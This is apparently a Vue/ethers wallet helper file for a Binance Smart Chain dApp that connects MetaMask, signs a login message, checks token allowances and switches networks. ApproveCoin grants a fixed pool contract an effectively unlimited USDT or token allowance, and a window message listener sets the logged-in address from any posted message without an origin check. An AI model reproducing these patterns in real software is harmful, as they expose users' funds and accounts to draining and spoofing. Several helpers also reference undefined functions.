import { showToast } from 'vant';
import 'vant/es/toast/style';
import { ethers } from "ethers";
import { Provider, Web3Provider } from "@ethersproject/providers"
import { useAddrStore } from '../store/user'
import { USDTcontractAddress, USDTcontractABI, LOGINcontractAddress, LTCcontractAddress, rechargeABI, poolAccount, XIERcontractABI } from "./constants";
import { storeToRefs } from 'pinia'
const store = useAddrStore()
const { address } = storeToRefs(store)

export async function getProvider() {
  // const { ethereum } = window;
  const provider = new Web3Provider(window.ethereum)
  return provider;
};

export async function createUSDTContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const USDTTransactionsContract = new ethers.Contract(USDTcontractAddress, USDTcontractABI, signer);
  return USDTTransactionsContract;
};

export async function createCCContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(LOGINcontractAddress, XIERcontractABI, signer);
  return TransactionsContract;
};

export async function createLTCContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(LTCcontractAddress, USDTcontractABI, signer);
  return TransactionsContract;
};

export async function createRechargeContract() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const TransactionsContract = new ethers.Contract(poolAccount, rechargeABI, signer);
  return TransactionsContract;
};

export async function sign() {
  const provider = await getProvider();
  const signer = await provider.getSigner();
  const result = await signer.signMessage(`Authorize Login`, address.value, 'Authorize');
  return result;
};

/**
 * 获取USDT余额
 * @returns balance
 */
export async function balance() {
  let MyContract = await createUSDTContract()
  let balance = await MyContract.balanceOf(address.value)
  balance = Number(ethers.utils.formatEther(balance.toString())).toFixed(4)
  return balance;
};

/**
 * @description: 大数据处理使用ethers
 * @param {*} amount
 * @param {*} tokenDecimals
 * @return {*}
 */
export async function toAmount(amount, tokenDecimals = 18) {
  return ethers.utils.parseEther(amount.toString(), tokenDecimals).toString();
}

/**
 * 查询授权额度
 * @param {代币类型} cointype 1USDT 2其他代币
 */
export async function allowance(cointype) {
  let status = null
  try {
    let MyContract = cointype == 1 ? await createUSDTContract() : await createLTCContract()
    await MyContract.allowance(address.value, poolAccount).then(
      res => {
        let n = Number(ethers.utils.formatEther(res.toString()));
        console.log("授权数量==", n);
        status = n > 0
        // this.approveFlag = n > 0;
      })
    return status
  } catch (error) {
    // this.allowanceBalance = 0;
    console.error("trigger smart contract error", error)
    showToast('上链失败~')
    return false
  }
}

/**
 * 代币授权
 * @param {代币类型} cointype 1USDT 2其他代币
 */
export async function ApproveCoin(cointype, cb) {
  let from = await createUSDTContract()
  let to = await createRechargeContract()
  from = cointype == 1 ? await createUSDTContract() : await createLTCContract()
  from.allowance(address.value, to.address).then(r => {
    if (r <= 1) {
      console.error('>>>>>>>>>>>>>>>>>>>', from, to.address);
      from.approve(to.address, "100000000000000000000000000000000").then((res) => {
        console.error("success1");
        cb && cb(res)
      }).catch(err => {
        console.error("err", err);
        cb && cb(false)
      })
    } else {
      console.error("success2");
      cb && cb(false)
    }
  }).catch(err => {
    console.error('...............', err);
    cb && cb(false)
  })
}

/**
 * @description: 获取chainid
 * @param {*}
 * @return {*}
 */
async function getChainId() {
  const { ethereum } = window;
  try {
    const chainId = await ethereum.request({
      method: "eth_chainId"
    });
    handleNewChain(chainId);
  } catch (err) {
    console.error(err);
  }
}

export function connetWallet() {
  return new Promise(async (resolve, reject) => {
    const { ethereum } = window;
    try {
      if (ethereum) {
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
        await getChainId(); //获取chanid参数
        // _listeningMetamsk();
        resolve(accounts[0]);
      } else {
        reject();
        showToast('请在区块链浏览器打开~')
      }
    } catch (err) {
      reject();
      showToast('请在区块链浏览器打开~')
    }
  })
};

/**
 * @description: 主动切换到BSC网络
 * @param {*}
 * @return {*}
 */
async function switchToEthereum() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [
        {
          chainId: "0x38"
        }
      ]
    });
  } catch (error) {
    console.log(error);
  }
}

/**
 * @description: 主动切换到其余链配置
 * @param {*} findChain
 * @return {*}
 */
async function switchToOtherNetwork(findChain) {
  try {
    await window.ethereum.request({
      method: "wallet_addEthereumChain",
      params: [
        {
          chainId: "0x38",
          chainName: "Binance Smart Chain",
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com/"]
        },
      ] // [{XXXXX}]  is Array
    });
  } catch (error) {
    console.log(error);
  }
}

/**
 * @description: switch or add rpcNetwork
 * @param {*} id chan_id（16）
 * @return {*}
 */
export async function switchNetwork(id) {
  let findChain = nativeMetamaskMap.find(v => v.chainId === id);
  if (!window.ethereum) {
    showToast('Please install metamsk')
    return;
  }
  if (!findChain) {
    showToast('The current website does not support the chain')
    return;
  }
  if (id === "0x38") {
    // switchToEthereum();
  } else {
    switchToOtherNetwork(findChain);
  }
}


/**
 * @description: matemask config
 * @param {*}
 * @return {*}
 */
export const nativeMetamaskMap = [
  {
    chainId: "0x1",
    chainName: "Ethereum Mainnet",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18
    },
    rpcUrls: ["https://mainnet.infura.io/v3/"],
    blockExplorerUrls: ["https://etherscan.io/"]
  },
  {
    chainId: "0x80",
    chainName: "huobi Network",
    nativeCurrency: {
      name: "HT",
      symbol: "HT",
      decimals: 18
    },
    rpcUrls: ["https://http-mainnet-node.huobichain.com"],
    blockExplorerUrls: ["https://hecoinfo.com"]
  },
  {
    chainId: "0x38",
    chainName: "Binance Smart Chain",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18
    },
    rpcUrls: ["https://bsc-dataseed.binance.org/"],
    blockExplorerUrls: ["https://bscscan.com/"]
  },
  {
    chainId: "0x61",
    chainName: "BSC-Test-Network",
    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18
    },
    rpcUrls: ["https://data-seed-prebsc-2-s3.binance.org:8545"],
    blockExplorerUrls: ["https://testnet.bscscan.com"]
  },
  {
    chainId: "0x539",
    chainName: "Local-Test-Network",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18
    },
    rpcUrls: ["https://mainnet.infura.io/v3/"],
    blockExplorerUrls: ["https://etherscan.io/"]
  }
];

/**
 * @description: handelConnectInfo
 * @param {*} info
 * @return {*}
 */
function handelConnectInfo(info) {
  console.log(info, "handelConnectInfo");
}

/**
 * @description: handleDisConnect
 * @param {*} disconnect
 * @return {*}
 */
function handleDisConnect(disconnect) {
  console.log(disconnect, "handleDisConnect");
}

/**
 * @description: handleNewAccount
 * @param {*} account
 * @return {*}
 */
function handleNewAccount(account) {
  updateAccount(account[0]);
}

/**
 * @description: handleNewChain
 * @param {*} account
 * @return {*}
 */
function handleNewChain(chain) {
  switchNetwork(chain)
}

/**
 * @description: handelNewMessage
 * @param {*} msg
 * @return {*}
 */
function handelNewMessage(msg) {
  console.log(msg, "handelNewMessage");
}

/**
 * @description: 监听链上钱包配置
 * @param {*}
 * @return {*}
 */
function _listeningMetamsk() {
  const { ethereum } = window;

  ethereum.on("chainChanged", handleNewChain);

  ethereum.on("accountsChanged", handleNewAccount);

  ethereum.on("message", handelNewMessage);

  ethereum.on("connect", throttle(handelConnectInfo, 1000));

  ethereum.on("disconnect", throttle(handleDisConnect, 1000));
}

//监听PC端账号切换
window.addEventListener('message', res => {
  const { ethereum } = window;
  if (!ethereum) return showToast('请在区块链浏览器打开~');
  const params = res?.data?.data?.data?.params;
  if (params && params[0] && params[0].length === 42) {
    store.loginaddr(params[0])
    // pubsub.publish('changeAccount',params[0]);
    // 执行登录操作
  }
  if (params && params.chainId) {
    if (params.chainId !== "0x38") {
      switchToOtherNetwork()
    }
  }
});